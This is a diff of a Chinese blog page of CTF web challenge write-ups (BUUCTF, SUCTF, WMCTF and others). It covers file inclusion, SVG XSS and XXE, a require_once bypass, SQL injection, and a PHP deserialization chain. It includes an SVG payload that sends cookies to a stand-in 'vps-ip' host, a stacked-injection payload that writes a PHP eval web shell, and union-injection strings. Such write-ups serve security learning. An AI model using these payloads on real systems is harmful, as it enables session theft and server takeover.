@@ -481,21 +481,21 @@ function get_the_flag()&amp;#123;
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2022-05-27
+                    2022-09-16
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    17.1k
+                    24.2k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    82 分
+                    116 分
                 </div>
                 
 
@@ -612,6 +612,7 @@ response &#x3D; requests.post(url&#x3D;url, data&#x3D;data, files&#x3D;files)
 print(response.text)</code></pre>
 
 <p>这里前半段传的是.htaccess，内容就是把.sss后缀的文件当作php进行解析，而且还对当前目录下的shell.sss进行了base64解码读取。</p>
+<p>利用auto_append_file来包含b64解码的shell.sss文章，这样往shell.sss里面写b64解密后的马，就可以绕过&lt;?的过滤了。</p>
 <p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220119194212595.png" alt="image-20220119194212595"></p>
 <p>得到路径之后蚁剑连一下</p>
 <p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220119194354577.png" alt="image-20220119194354577"></p>
@@ -861,9 +862,9 @@ $Public_key &#x3D; public_key();
 <p>得到种子之后就能得到私钥的值了</p>
 <p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220306161532376.png" alt="image-20220306161532376"></p>
 <p>对于密码这部分可以直接用万能密码</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220306161615805.png" alt="image-20220306161615805"></p>
 <p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220306161558813.png" alt="image-20220306161558813"></p>
 <p>登录拿到flag</p>
-<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220306161615805.png" alt="image-20220306161615805"></p>
 <h2 id="网鼎杯-track-hacker"><a href="#网鼎杯-track-hacker" class="headerlink" title="[网鼎杯]track_hacker"></a>[网鼎杯]track_hacker</h2><p>不是buu的题，也没啥难度，就是记录一下这种解码的方式</p>
 <p>用python2解码</p>
 <p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220313151128218.png" alt="image-20220313151128218"></p>
@@ -1392,26 +1393,6 @@ end</code></pre>
 <p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220407150645048.png" alt="image-20220407150645048"></p>
 <p>买了flag之后再对jwt解个码就能拿到flag了</p>
 <p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220407150731822.png" alt="image-20220407150731822"></p>
-<h2 id="b01lers2020-Life-on-Mars"><a href="#b01lers2020-Life-on-Mars" class="headerlink" title="[b01lers2020]Life on Mars"></a>[b01lers2020]Life on Mars</h2><p>进入题目之后点击网页的几个按钮连个跳转都没有，遇事不决抓个包看看</p>
-<p>看到有个search参数，这里存在sql注入</p>
-<p>先用order by探一下列数，然后直接联合注入</p>
-<p>注表名：</p>
-<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220408103158993.png" alt="image-20220408103158993"></p>
-<p>但是这里并没有什么可以的表，猜测是不是有其他库，重新去看一下库名</p>
-<p>这里用database()只能看到一个aliens库，因为database()只能看到当前库，下次记得一定要把所有库都查出来</p>
-<p>用<code>union+select+1,group_concat(schema_name)+from+information_schema.schemata</code>这个语句可以注出另外两个库<img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220408104227983.png" alt="image-20220408104227983"></p>
-<p>看一下alien_code库</p>
-<pre class="language-none"><code class="language-none">search&#x3D;amazonis_planitia+union+select+1,group_concat(table_name)+from+information_schema.tables+where+table_schema&#x3D;&#39;alien_code&#39;</code></pre>
-
-<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220408104425032.png" alt="image-20220408104425032"></p>
-<p>再看看code表</p>
-<pre class="language-none"><code class="language-none">search&#x3D;amazonis_planitia+union+select+1,group_concat(column_name)+from+information_schema.columns+where+table_name&#x3D;&#39;code&#39;</code></pre>
-
-<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220408104548291.png" alt="image-20220408104548291"></p>
-<p>爆字段</p>
-<pre class="language-none"><code class="language-none">search&#x3D;amazonis_planitia+union+select+1,group_concat(id,code)+from+alien_code.code</code></pre>
-
-<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220408104808831.png" alt="image-20220408104808831"></p>
 <h2 id="GKCTF-2021-easycms"><a href="#GKCTF-2021-easycms" class="headerlink" title="[GKCTF 2021]easycms"></a>[GKCTF 2021]easycms</h2><p>提示是后台五位弱密码</p>
 <p>所以猜admin/admin或者是admin/12345</p>
 <p>进入后直接访问admin.php然后admin/12345登录</p>
@@ -2429,7 +2410,836 @@ if(!in_array($ext,$allowtype))&#123;
 <p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220421225045605.png" alt="image-20220421225045605"></p>
 <p>利用分号执行多个注释，然后利用井号注释掉后面的语句</p>
 <p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220421224821554.png" alt="image-20220421224821554"></p>
+<h2 id="网鼎杯-2020-半决赛-AliceWebsite"><a href="#网鼎杯-2020-半决赛-AliceWebsite" class="headerlink" title="[网鼎杯 2020 半决赛]AliceWebsite"></a>[网鼎杯 2020 半决赛]AliceWebsite</h2><p>额。。。</p>
+<p>看下载的附件里的index.php，有一个action可以进行文件包含，实现任意文件读取，然后就是直接猜flag文件名为flag，在根目录就行</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220711120411219.png" alt="image-20220711120411219"></p>
+<h2 id="极客大挑战-2020-Roamphp1-Welcome"><a href="#极客大挑战-2020-Roamphp1-Welcome" class="headerlink" title="[极客大挑战 2020]Roamphp1-Welcome"></a>[极客大挑战 2020]Roamphp1-Welcome</h2><p>挺有意思的一个题，但是没什么难度</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220711121147541.png" alt="image-20220711121147541"></p>
+<p>打开环境的时候405还以为是环境有问题，但是这里状态码是405，也就是请求方式错误，抓包改一下请求方式就能看见php代码了</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220711121340111.png" alt="image-20220711121340111"></p>
+<p>然后就是考烂了的md5的绕过，在phpinfo里有flag</p>
+<h2 id="HarekazeCTF2019-Avatar-Uploader"><a href="#HarekazeCTF2019-Avatar-Uploader" class="headerlink" title="[HarekazeCTF2019]Avatar Uploader"></a>[HarekazeCTF2019]Avatar Uploader</h2><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220711122817759.png" alt="image-20220711122817759"></p>
+<p>源码里主要看这三个地方，其他的都不重要</p>
+<p>在检查文件类型时，<code>finfo_file()</code>函数检测上传图片的类型是否是<code>image/png</code><br>在检查文件长宽时，<code>getimagesize()</code> 函数用于获取图像大小及相关信息，成功将返回一个数组</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220711122935596.png" alt="image-20220711122935596"></p>
+<p>我们的目的就是让最后的那个if满足</p>
+<p>也就是让<code>getimagesize()</code> 函数识别不出上传的为png文件</p>
+<p>因为finfo_file()可以识别png图片<strong>十六进制下的第一行</strong>，而 getimagesize 不可以。所以只要保持png头破坏掉文件长宽等其余信息就能绕过了</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220711123221085.png" alt="image-20220711123221085"></p>
+<p>然后上传就可以了</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220711123237676.png" alt="image-20220711123237676"></p>
+<h2 id="BSidesCF-2019-SVGMagic"><a href="#BSidesCF-2019-SVGMagic" class="headerlink" title="[BSidesCF 2019]SVGMagic"></a>[BSidesCF 2019]SVGMagic</h2><p>做这个题之前要先看一下SVG是什么</p>
+<p>SVG简介</p>
+<pre class="language-none"><code class="language-none">SVG(Scalable Vector Graphics)是一种基于XML的二维矢量图格式，和我们平常用的jpg&#x2F;png等图片格式所不同的是SVG图像在放大或改变尺寸的情况下其图形质量不会有所损失，并且我们可以使用任何的文本编辑器打开SVG图片并且编辑它，目前主流的浏览器都已经支持SVG图片的渲染。</code></pre>
 
+<p>创建 SVG 图像<br>SVG 文档基本结构</p>
+<p>如下所示，是一个 SVG 文档结构：</p>
+<pre class="language-php" data-language="php"><code class="language-php">&lt;svg width&#x3D;&#39;140&#39; heiight&#x3D;&#39;170&#39; xmlns&#x3D;&#39;http:&#x2F;&#x2F;wwww.w3.org&#x2F;2000&#x2F;svg&#39;&gt;
+  &lt;title&gt;Cat&lt;&#x2F;title&gt;
+  &lt;desc&gt;Stick Figure of Cat&lt;&#x2F;desc&gt;
+  &lt;!-- 在这里绘制图像 --&gt;
+&lt;&#x2F;svg&gt;</code></pre>
+
+<p>根元素<code>&lt;svg&gt;</code>以像素为单位定义了整个图像的 width 和 height，还通过 xmlns 属性定义了 SVG 的命名空间。<code>&lt;title&gt;</code> 元素的内容可以被阅读器显示在标题栏上或者是作为鼠标指针指向图像时的提示， <code>&lt;desc&gt; </code>元素允许咱们为图像定义完整的描述信息。</p>
+<p>基本形状和属性</p>
+<p>基本图形</p>
+<p><code>&lt;rect&gt;、&lt;circle&gt;、&lt;ellipse&gt;、&lt;line&gt;、&lt;polyline&gt;、&lt;polygon&gt;</code></p>
+<p>基本属性</p>
+<p>fill、stroke、stroke-width、transform</p>
+<p>基本形状 --- 圆形<br><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220711205338279.png" alt="image-20220711205338279"></p>
+<p><strong>SVG造成XSS</strong></p>
+<p>但是如果我们在这里插入一个xss</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220711205545773.png" alt="image-20220711205545773"></p>
+<p>可以看到也能执行</p>
+<p><strong>原因</strong></p>
+<pre class="language-none"><code class="language-none">这是因为SVG是支持通过脚本语言来动态访问和修改SVG的任何内容，这点和HTML中的DOM类似，或者说完全一致。因为SVG中的所有标签和属性都已经对应了已经定义的DOM，而这种脚本语言就是JavaScript，所以我们在SVG中插入JavaScript脚本是完全能够被解析的。
+
+在国际的SVG标准中定义了script标签的存在，总之XSS之所以能够执行是因为遵循了svg及xml的标准。</code></pre>
+
+<p>所以可以用</p>
+<p><code>&lt;svg/onload=&quot;document.location=&#39;http://vps-ip:1234&#39;+document.cookie&quot;&gt;</code></p>
+<p>这种payload实现盗取管理员cookie的目的</p>
+<p><strong>SVG造成XXE</strong></p>
+<p>因为SVG是一种用<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=XML&spm=1001.2101.3001.7020">XML</a>定义的语言</p>
+<p>所以这个也存在着xxe的漏洞</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220711212326994.png" alt="image-20220711212326994"></p>
+<p>这里就会返回一个带着passwd文件内容的图片，可以通过修改图片宽度来看后边的部分</p>
+<p>后边就是猜flag文件的部分了，flag文件名为flag.txt，且在当前目录，但是我们不知道我们当前的目录</p>
+<p>这里可以用/proc/self/cwd来获取目标当前进程环境的运行目录与目录里的文件</p>
+<p>所以最终的payload为</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220711213049790.png" alt="image-20220711213049790"></p>
+<p>参考文章：</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_38154820/article/details/110152943">浅谈SVG的两个黑魔法_合天网安实验室的博客-CSDN博客</a></p>
+<h2 id="WMCTF2020-Make-PHP-Great-Again"><a href="#WMCTF2020-Make-PHP-Great-Again" class="headerlink" title="[WMCTF2020]Make PHP Great Again"></a>[WMCTF2020]Make PHP Great Again</h2><pre class="language-php" data-language="php"><code class="language-php">&lt;?php
+highlight_file(__FILE__);
+require_once &#39;flag.php&#39;;
+if(isset($_GET[&#39;file&#39;])) &#123;
+  require_once $_GET[&#39;file&#39;];
+&#125;</code></pre>
+
+<p>这题的考点就是require_once的绕过，这个函数所包含的文件只能被包含一次，这样的话我们就不能直接用伪协议来再包含一次flag.php了</p>
+<pre class="language-none"><code class="language-none">php的文件包含机制是将已经包含的文件与文件的真实路径放进哈希表中，当已经require_once(&#39;flag.php&#39;)，已经include的文件不可以再require_once。</code></pre>
+
+<p>在这里有个小知识点，<code>/proc/self</code>指向当前进程的<code>/proc/pid/</code>，<code>/proc/self/root/</code>是指向<code>/</code>的符号链接，想到这里，用伪协议配合多级符号链接的办法进行绕过，payload:</p>
+<pre class="language-none"><code class="language-none">php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php </code></pre>
+
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220711213946435.png" alt="image-20220711213946435"></p>
+<p>但是这个需要知道当前目录，我们可以根据上一题提到的知识改进一下</p>
+<pre class="language-none"><code class="language-none">php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;cwd&#x2F;flag.php </code></pre>
+
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220711214145577.png" alt="image-20220711214145577"></p>
+<p>原理可以去看这个</p>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/213235#h2-8">php源码分析 require_once 绕过不能重复包含文件的限制 - 安全客，安全资讯平台 (anquanke.com)</a></p>
+<h2 id="FireshellCTF2020-Caas"><a href="#FireshellCTF2020-Caas" class="headerlink" title="[FireshellCTF2020]Caas"></a>[FireshellCTF2020]Caas</h2><p>开局一个大输入框</p>
+<p>要求我们输入代码进行编辑，看报错能猜出来这是c的文件</p>
+<p>然后是利用了#include &quot;&quot;预处理编译报错</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220714132332448.png" alt="image-20220714132332448"></p>
+<p>通过报错可以把include的文件内容输出出来</p>
+<h2 id="October-2019-Twice-SQL-Injection"><a href="#October-2019-Twice-SQL-Injection" class="headerlink" title="October 2019 Twice SQL Injection"></a>October 2019 Twice SQL Injection</h2><p>这个二次注入就是在注册的时候把注入语句作为username就行</p>
+<p>其他的功能基本上没啥用</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220714134524580.png" alt="image-20220714134524580"></p>
+<pre class="language-txt" data-language="txt"><code class="language-txt">username &#x3D;1&#39; union select database() #
+username &#x3D;1&#39; union select group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;ctftraining&#39; #
+ 
+username &#x3D;1&#39; union select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;flag&#39;#
+ &#x2F;*这里可以直接
+ username &#x3D;1&#39; union select * from flag #
+ *&#x2F;
+username &#x3D;1&#39; union select flag from flag #</code></pre>
+
+<h2 id="SUCTF-2018-MultiSQL"><a href="#SUCTF-2018-MultiSQL" class="headerlink" title="[SUCTF 2018]MultiSQL"></a>[SUCTF 2018]MultiSQL</h2><p>sql的预处理</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220714161112201.png" alt="image-20220714161112201"></p>
+<p>这里有两个注入点</p>
+<p>一个是注册的地方对用户名有一个过滤，应该是可以二次注入的</p>
+<p>还一个是在登录后的id的位置，有个数字型的盲注，这个还能造成越权访问，不过没啥用</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220714161354408.png" alt="image-20220714161354408"></p>
+<p>题目本身有一些过滤，用<code>id=1^(if(ascii(mid(user(),1,1))&gt;0,0,1))</code>异或的方式来判断注入点</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220714162007822.png" alt="image-20220714162007822"></p>
+<p>这里呢过滤了union，select ，&amp;，|</p>
+<p>不过flag也不在数据库里，这里是要求用outfile写文件进去，可写的路径是/var/www/html/favicon/目录下，这是因为有个修改头像的功能，上传的头像就在这个目录下</p>
+<p>不想写了，偷个代码</p>
+<pre class="language-python" data-language="python"><code class="language-python">str&#x3D;&quot;select &#39;&lt;?php eval($_POST[_]);?&gt;&#39; into outfile &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;favicon&#x2F;shell.php&#39;;&quot;
+len_str&#x3D;len(str)
+for i in range(0,len_str):
+	if i &#x3D;&#x3D; 0:
+		print(&#39;char(%s&#39;%ord(str[i]),end&#x3D;&quot;&quot;)
+	else:
+		print(&#39;,%s&#39;%ord(str[i]),end&#x3D;&quot;&quot;)
+print(&#39;)&#39;)
+</code></pre>
+
+<p>然后借助堆叠注入和预处理方式</p>
+<p>最终payload为</p>
+<pre class="language-txt" data-language="txt"><code class="language-txt">?id&#x3D;1;set @sql&#x3D;char(115,101,108,101,99,116,32,39,60,63,112,104,112,32,101,118,97,108,40,36,95,80,79,83,84,91,95,93,41,59,63,62,39,32,105,110,116,111,32,111,117,116,102,105,108,101,32,39,47,118,97,114,47,119,119,119,47,104,116,109,108,47,102,97,118,105,99,111,110,47,115,104,101,108,108,46,112,104,112,39,59);prepare query from @sql;execute query;</code></pre>
+
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220714165313730.png" alt="image-20220714165313730"></p>
+<h2 id="EIS-2019-EzPOP"><a href="#EIS-2019-EzPOP" class="headerlink" title="[EIS 2019]EzPOP"></a>[EIS 2019]EzPOP</h2><p>好难的链子，做这个之前本来以为自己的反序列化水平还可以了，不过现在看起来也就那样了hhhh</p>
+<pre class="language-php" data-language="php"><code class="language-php">&lt;?php
+error_reporting(0);
+
+class A &#123;
+
+    protected $store;
+
+    protected $key;
+
+    protected $expire;
+
+    public function __construct($store, $key &#x3D; &#39;flysystem&#39;, $expire &#x3D; null) &#123;
+        $this-&gt;key &#x3D; $key;
+        $this-&gt;store &#x3D; $store;
+        $this-&gt;expire &#x3D; $expire;
+    &#125;
+
+    public function cleanContents(array $contents) &#123;
+        $cachedProperties &#x3D; array_flip([
+            &#39;path&#39;, &#39;dirname&#39;, &#39;basename&#39;, &#39;extension&#39;, &#39;filename&#39;,
+            &#39;size&#39;, &#39;mimetype&#39;, &#39;visibility&#39;, &#39;timestamp&#39;, &#39;type&#39;,
+        ]);
+
+        foreach ($contents as $path &#x3D;&gt; $object) &#123;
+            if (is_array($object)) &#123;
+                $contents[$path] &#x3D; array_intersect_key($object, $cachedProperties);
+            &#125;
+        &#125;
+
+        return $contents;
+    &#125;
+
+    public function getForStorage() &#123;
+        $cleaned &#x3D; $this-&gt;cleanContents($this-&gt;cache);
+
+        return json_encode([$cleaned, $this-&gt;complete]);
+    &#125;
+
+    public function save() &#123;
+        $contents &#x3D; $this-&gt;getForStorage();
+
+        $this-&gt;store-&gt;set($this-&gt;key, $contents, $this-&gt;expire);
+    &#125;
+
+    public function __destruct() &#123;
+        if (!$this-&gt;autosave) &#123;
+            $this-&gt;save();
+        &#125;
+    &#125;
+&#125;
+
+class B &#123;
+
+    protected function getExpireTime($expire): int &#123;
+        return (int) $expire;
+    &#125;
+
+    public function getCacheKey(string $name): string &#123;
+        return $this-&gt;options[&#39;prefix&#39;] . $name;
+    &#125;
+
+    protected function serialize($data): string &#123;
+        if (is_numeric($data)) &#123;
+            return (string) $data;
+        &#125;
+
+        $serialize &#x3D; $this-&gt;options[&#39;serialize&#39;];
+
+        return $serialize($data);
+    &#125;
+
+    public function set($name, $value, $expire &#x3D; null): bool&#123;
+        $this-&gt;writeTimes++;
+
+        if (is_null($expire)) &#123;
+            $expire &#x3D; $this-&gt;options[&#39;expire&#39;];
+        &#125;
+
+        $expire &#x3D; $this-&gt;getExpireTime($expire);
+        $filename &#x3D; $this-&gt;getCacheKey($name);
+
+        $dir &#x3D; dirname($filename);
+
+        if (!is_dir($dir)) &#123;
+            try &#123;
+                mkdir($dir, 0755, true);
+            &#125; catch (\Exception $e) &#123;
+                &#x2F;&#x2F; 创建失败
+            &#125;
+        &#125;
+
+        $data &#x3D; $this-&gt;serialize($value);
+
+        if ($this-&gt;options[&#39;data_compress&#39;] &amp;&amp; function_exists(&#39;gzcompress&#39;)) &#123;
+            &#x2F;&#x2F;数据压缩
+            $data &#x3D; gzcompress($data, 3);
+        &#125;
+
+        $data &#x3D; &quot;&lt;?php\n&#x2F;&#x2F;&quot; . sprintf(&#39;%012d&#39;, $expire) . &quot;\n exit();?&gt;\n&quot; . $data;
+        $result &#x3D; file_put_contents($filename, $data);
+
+        if ($result) &#123;
+            return true;
+        &#125;
+
+        return false;
+    &#125;
+
+&#125;
+
+if (isset($_GET[&#39;src&#39;]))
+&#123;
+    highlight_file(__FILE__);
+&#125;
+
+$dir &#x3D; &quot;uploads&#x2F;&quot;;
+
+if (!is_dir($dir))
+&#123;
+    mkdir($dir);
+&#125;
+unserialize($_GET[&quot;data&quot;]);</code></pre>
+
+<p>利用点是很明显的</p>
+<p>B类里的set方法里调用了一个file_put_contents，然后两个参数在一定程度上是可控的，所以我们可以利用这个来写马</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220714225843677.png" alt="image-20220714225843677"></p>
+<p><strong>我们先来看data参数</strong></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220714230047933.png" alt="image-20220714230047933"></p>
+<p>可以看到data参数在将value参数作为serialize方法的参数调用后，将serialize方法的返回值进行了拼接，最终成为了我们写入的内容</p>
+<p>这里是serizalize方法的内容</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220714230354313.png" alt="image-20220714230354313"></p>
+<p>就是将serialize赋成一个函数，再执行一下将其返回</p>
+<p>这里我们可以让options[&#39;serialize&#39;]=trim，这样返回的值只会去掉首尾的空格，内容不变</p>
+<p>所以这里data的值就是$value，而$value是作为set方法里的一个参数出现的</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220714231215057.png" alt="image-20220714231215057"></p>
+<p>另外要注意别让数据压缩</p>
+<p>也就是让$this-&gt;options[&#39;data_compress&#39;] = false;</p>
+<p>而要调用set方法就要看A类里的save方法了</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220714231306819.png" alt="image-20220714231306819"></p>
+<p>然后这里还调用了getForStorage，将getForStorage的返回值当作$contents，也就是set中的$value，getForStorage中还通过cleanContents来对cleaned的值进行了过滤</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220714231425923.png" alt="image-20220714231425923"></p>
+<p>在这里可以令cache=array()，这样就能保证contents的仅仅是complete这个变量的内容了</p>
+<p>而为了实现调用save参数的目的，我们要看反序列化的入口<img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220714232051375.png" alt="image-20220714232051375"></p>
+<p>让autosave=false</p>
+<pre class="language-txt" data-language="txt"><code class="language-txt">经过上面的分析，我们已知的要定义的内容有
+autosave&#x3D;false
+complete&#x3D;payload
+cache&#x3D;array()
+options[&#39;serialize&#39;]&#x3D;trim
+$this-&gt;store &#x3D; new B()
+$this-&gt;options[&#39;data_compress&#39;] &#x3D; false;</code></pre>
+
+<p><strong>然后再来看filename部分</strong></p>
+<p>filename是经过getCacheKey函数拼接后的结果，我们可以让</p>
+<p>options[&#39;prefix&#39;]=shell 然后让name=.php，一样可以达到写入php马的目的</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220714232546060.png" alt="image-20220714232546060"></p>
+<p>接下来就要看name的来源了</p>
+<p>这同样是set的一个形参，是A类中key变量的值，我们可以直接对其赋值</p>
+<p>这部分我们定义的参数可以为</p>
+<pre class="language-php" data-language="php"><code class="language-php">options[&#39;prefix&#39;]&#x3D;shell
+key &#x3D; .php</code></pre>
+
